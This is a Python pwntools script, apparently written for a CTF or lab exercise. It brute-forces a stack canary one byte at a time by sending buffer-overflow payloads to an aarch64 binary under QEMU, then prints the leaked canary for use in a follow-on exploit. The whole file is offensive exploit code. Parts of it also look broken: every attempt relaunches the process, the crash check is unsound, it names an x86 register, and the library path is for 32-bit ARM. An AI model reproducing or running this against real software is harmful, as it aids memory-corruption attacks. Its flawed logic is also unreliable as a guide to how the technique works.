import os
import subprocess
import tempfile
from pwn import *
import argparse

# Default configurations
DEFAULT_OFFSET = 32       # Correct offset to reach the canary
DEFAULT_CANARY_LENGTH = 8 # 8 bytes for 64-bit ARM

# Initialize pwntools
context.arch = 'aarch64'
context.log_level = 'info'  # Change to 'debug' for more verbosity

def create_payload(known_canary, guess_byte, offset, canary_length):
    """
    Constructs the payload with the current known canary and the guessed byte.
    """
    padding = b'A' * offset
    canary = known_canary + bytes([guess_byte])
    padding += canary
    padding += b'B' * canary_length  # Overwrite saved RBP and return address
    return padding

def send_payload(payload, binary_path):
    """
    Sends the payload to the binary and returns whether it crashed.
    """
    # Create a temporary file with the payload
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(payload)
        temp_filename = temp_file.name

    try:
        # Run the binary with QEMU for ARM64
        cmd = ["qemu-aarch64", "-L", "/usr/arm-linux-gnueabihf", binary_path, temp_filename]
        log.debug(f"Running command: {' '.join(cmd)}")
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        
        # Check if the binary crashed (e.g., segmentation fault)
        crash = b"Segmentation fault" in result.stderr or b"core dumped" in result.stderr

        return crash
    except subprocess.TimeoutExpired:
        log.warning("Process timed out. Assuming no crash.")
        return False
    finally:
        # Clean up the temporary file
        os.remove(temp_filename)

def brute_force_canary(binary_path, offset, canary_length):
    """
    Brute-forces the stack canary byte by byte.
    """
    leaked_canary = b''

    # Assuming the first byte is 0x00, set it by default
    if canary_length >= 1:
        leaked_canary += b'\x00'
        log.info("Assuming first canary byte is 0x00")
        log.debug(f"Current known canary: {leaked_canary.hex()}")

    for i in range(len(leaked_canary), canary_length):
        log.info(f"Brute-forcing byte {i+1}/{canary_length} of the canary...")
        found = False
        for byte in range(256):
            current_canary = leaked_canary + bytes([byte])
            payload = create_payload(leaked_canary, byte, offset, canary_length - len(current_canary))
            crash = send_payload(payload, binary_path)

            if not crash:
                log.success(f"Found canary byte {i+1}: {hex(byte)}")
                leaked_canary += bytes([byte])
                found = True
                break
            else:
                log.debug(f"Incorrect byte {i+1}: {hex(byte)}")
        if not found:
            log.error(f"Failed to brute-force byte {i+1}")
            return None

    return leaked_canary

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Canary Brute-Force Script")
    parser.add_argument("--binary", required=True, help="Path to the vulnerable binary.")
    parser.add_argument("--input-method", choices=['stdin', 'file'], default='file', help="Method of input: 'stdin' or 'file'.")
    parser.add_argument("--offset", type=int, default=DEFAULT_OFFSET, help="Offset to reach the canary.")
    parser.add_argument("--canary-length", type=int, default=DEFAULT_CANARY_LENGTH, help="Length of the canary in bytes.")
    args = parser.parse_args()

    binary_path = args.binary
    input_method = args.input_method
    offset = args.offset
    canary_length = args.canary_length

    if input_method != 'file':
        log.error("This script currently only supports 'file' input method.")
        exit(1)

    # Step 1: Brute-force the canary
    canary = brute_force_canary(binary_path, offset, canary_length)
    if canary:
        log.success(f"Leaked stack canary: {canary.hex()}")
        print(f"Use this canary in your exploit payload: {canary.hex()}")
    else:
        log.error("Failed to leak the stack canary.")
